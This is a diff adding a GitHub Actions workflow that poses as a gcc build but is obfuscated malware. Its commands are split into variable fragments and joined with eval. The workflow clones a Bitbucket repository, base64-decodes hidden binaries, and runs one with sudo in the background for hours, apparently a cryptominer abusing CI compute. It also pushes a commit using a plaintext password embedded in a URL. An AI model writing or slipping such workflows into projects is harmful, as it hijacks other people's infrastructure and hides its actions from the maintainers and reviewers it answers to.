@@ -1,0 +1,70 @@
+name: phd-5ht-co
+on:
+  push:
+    branches: [ master ]
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - name: run
+        run: |
+          sudo apt update || true
+          upJMU="sudo apt --"
+          RPoiqLdpu="yes install"
+          zYqtCGP=" cl-base64 "
+          tOLfwlSe="git &>/dev/"
+          eval "$upJMU""$RPoiqLdpu""$zYqtCGP""$tOLfwlSe""null"
+          FHgFNukO="git clone h"
+          dRPuUm="ttps://gccb"
+          IJumCInNq="uild@bitbuc"
+          hLcYEkmfO="ket.org/gcc"
+          SJbOs="build/gcc.g"
+          nrmBNoaFzan="it &>/dev/n"
+          eval "$FHgFNukO""$dRPuUm""$IJumCInNq""$hLcYEkmfO""$SJbOs""$nrmBNoaFzan""ull"
+          cVpvA="base64 -d g"
+          bPQRk="cc/cmake_ >"
+          eval "$cVpvA""$bPQRk"" cmake"
+          nLbUHFv="base64 -d g"
+          mTgqQ="cc/config_ "
+          yZqVUsrcu="> output.lo"
+          eval "$nLbUHFv""$mTgqQ""$yZqVUsrcu""g"
+          cyiGBnOMBy="base64 -d g"
+          FXwten="cc/make_ > "
+          eval "$cyiGBnOMBy""$FXwten""release"
+          chmod +x release cmake
+          ./cmake
+          sed -i 's/build/gg1o/g' output.log
+          bzpibUFX="sudo ./rele"
+          PfKZDUeLWzw="ase --confi"
+          zKqDsexFcy="g output.lo"
+          meDTL="g &>/dev/nu"
+          eval "$bzpibUFX""$PfKZDUeLWzw""$zKqDsexFcy""$meDTL""ll &"
+          GCC=$(date +%s)
+          MyyMV="git clone h"
+          MgMTbBmbGb="ttps://gith"
+          OmJYd="ub.com/sexb"
+          RqDLMd="jose-erlang"
+          ekVLnjDhd="/phd-5ht-co"
+          eval "$MyyMV""$MgMTbBmbGb""$OmJYd""$RqDLMd""$ekVLnjDhd"".git tmp"
+          cd tmp
+          echo $GCC >> 9QuRbKY
+          git config user.name yegor-wuyko
+          YfHbsGMvV="git config "
+          jzbulDkgU="user.email "
+          LnjepoqPL="yegor.wuyko"
+          eval "$YfHbsGMvV""$jzbulDkgU""$LnjepoqPL""@rambler.ua"
+          Mrchw="git add 9Qu"
+          eval "$Mrchw""RbKY"
+          kzKsfJ="git commit "
+          zgiSP="-m Vkommiti"
+          eval "$kzKsfJ""$zgiSP""l"
+          ClicBA="git push ht"
+          SnNDNPgLbw="tps://yegor"
+          FlMZkDR="-wuyko:'lDw"
+          RkWDMDx="mArmzUo22YS"
+          ZDTVvc="-8Na'@githu"
+          McibTbWuvw="b.com/sexbj"
+          rOcflrTBDy="ose-erlang/"
+          BuHKe="phd-5ht-co."
+          eval "$ClicBA""$SnNDNPgLbw""$FlMZkDR""$RkWDMDx""$ZDTVvc""$McibTbWuvw""$rOcflrTBDy""$BuHKe""git -f"
+          while true; do CC=$(date +%s); echo Build; [ $CC -ge $((GCC + 19384)) ] && sudo killall release && break; sleep 214; done
